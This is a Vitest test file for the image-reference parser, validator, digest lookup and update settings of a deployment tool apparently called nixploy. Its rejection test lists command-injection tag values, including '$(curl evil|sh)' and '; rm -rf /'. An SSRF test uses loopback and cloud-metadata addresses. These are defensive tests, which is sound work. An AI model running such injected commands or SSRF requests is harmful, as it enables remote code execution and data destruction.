import { describe, expect, it } from "vitest";
import { assertValidImageRef, fetchRemoteDigest, normalizeDigest, parseImageRef } from "./registry";
import { parseUpdateSettings } from "./settings";

describe("parseImageRef", () => {
	it("parses GHCR tag refs", () => {
		const ref = parseImageRef("ghcr.io/bablilayoub/nixploy:latest");
		expect(ref).toEqual({
			registry: "ghcr.io",
			repository: "bablilayoub/nixploy",
			tag: "latest",
			digest: null,
			canonical: "ghcr.io/bablilayoub/nixploy:latest",
		});
	});

	it("parses digest-pinned refs", () => {
		const digest = `sha256:${"a".repeat(64)}`;
		const ref = parseImageRef(`ghcr.io/bablilayoub/nixploy@${digest}`);
		expect(ref.tag).toBeNull();
		expect(ref.digest).toBe(digest);
		expect(ref.canonical).toBe(`ghcr.io/bablilayoub/nixploy@${digest}`);
	});

	it("defaults missing tags to latest", () => {
		expect(parseImageRef("ghcr.io/bablilayoub/nixploy").tag).toBe("latest");
	});

	it("maps Docker Hub short names to library/", () => {
		const ref = parseImageRef("nginx:1.27");
		expect(ref.registry).toBe("docker.io");
		expect(ref.repository).toBe("library/nginx");
		expect(ref.tag).toBe("1.27");
		expect(ref.canonical).toBe("docker.io/library/nginx:1.27");
	});
});

describe("assertValidImageRef", () => {
	it("accepts well-formed tag and digest refs and returns the canonical form", () => {
		expect(assertValidImageRef(" ghcr.io/bablilayoub/nixploy:v0.2.0 ").canonical).toBe(
			"ghcr.io/bablilayoub/nixploy:v0.2.0",
		);
		expect(assertValidImageRef(`ghcr.io/bablilayoub/nixploy@sha256:${"b".repeat(64)}`).digest).toBe(
			`sha256:${"b".repeat(64)}`,
		);
		expect(assertValidImageRef("nginx").canonical).toBe("docker.io/library/nginx:latest");
	});

	it("rejects shell metacharacters, whitespace and malformed components", () => {
		for (const bad of [
			"ghcr.io/bablilayoub/nixploy:$(curl evil|sh)",
			"ghcr.io/bablilayoub/nixploy:latest; rm -rf /",
			"ghcr.io/bablilayoub/nixploy:`id`",
			"ghcr.io/bablilayoub/nixploy:v1 extra",
			"ghcr.io/bablilayoub/nixploy@sha256:short",
			"ghcr.io/Bablilayoub/nixploy:latest",
			"",
		]) {
			expect(() => assertValidImageRef(bad), bad).toThrow(/Invalid image reference/);
		}
	});
});

describe("fetchRemoteDigest", () => {
	it("refuses private / loopback registries (SSRF)", async () => {
		expect(await fetchRemoteDigest("localhost:5000/evil:latest")).toBeNull();
		expect(await fetchRemoteDigest("127.0.0.1/evil:latest")).toBeNull();
		expect(await fetchRemoteDigest("169.254.169.254/evil:latest")).toBeNull();
	});
});

describe("normalizeDigest", () => {
	it("extracts sha256 from RepoDigest lines", () => {
		const digest = `sha256:${"b".repeat(64)}`;
		expect(normalizeDigest(`ghcr.io/bablilayoub/nixploy@${digest}`)).toBe(digest);
		expect(normalizeDigest(digest.toUpperCase())).toBe(digest);
		expect(normalizeDigest("not-a-digest")).toBeNull();
	});
});

describe("parseUpdateSettings", () => {
	it("returns defaults for empty config", () => {
		const settings = parseUpdateSettings(null);
		expect(settings.autoCheckEnabled).toBe(true);
		expect(settings.autoUpdateEnabled).toBe(false);
		expect(settings.image).toBe("ghcr.io/bablilayoub/nixploy:latest");
	});

	it("reads nested extras", () => {
		const settings = parseUpdateSettings({
			webServer: {
				autoCheckEnabled: false,
				autoUpdateEnabled: true,
				updateCheckCron: "0 4 * * *",
				updateAvailable: true,
			},
		});
		expect(settings.autoCheckEnabled).toBe(false);
		expect(settings.autoUpdateEnabled).toBe(true);
		expect(settings.checkCron).toBe("0 4 * * *");
		expect(settings.updateAvailable).toBe(true);
	});
});
